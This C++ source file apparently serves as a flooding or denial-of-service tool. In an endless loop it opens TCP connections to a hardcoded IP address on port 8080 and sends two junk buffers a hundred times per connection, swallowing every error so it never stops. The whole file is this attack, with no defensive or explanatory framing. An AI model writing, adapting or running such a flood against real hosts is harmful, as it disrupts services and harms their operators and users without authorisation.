#include <iostream>
#include <cplib/cplib.hpp>
#include <cplib/asyncsock.hpp>
#include <signal.h>

using namespace xaxaxa;
using namespace Sockets;
int main()
{
	signal(SIGPIPE,SIG_IGN);
	Buffer b((char*)"torlolololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololo");
	Buffer b2((char*)"pornononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononono");
	IPEndPoint ep(IPAddress("168.188.130.213"),8080);
	while(true)
	{
		try
		{
			Socket s(AF_INET,SOCK_STREAM,0);
			s.Connect(&ep);
			try
			{
				int i;
				for(i=0;i<100;i++)
				{
					s.Send(b);
					s.Send(b2);
				}
			}
			catch(Exception& ex){}
			s.Close();
		}
		catch(Exception& ex){}
	}
	/*Buffer recvb(4096);
	int br;
	while((br=s.Recv(recvb)))
	{
		write(1,recvb.Data,br);
	}*/
}
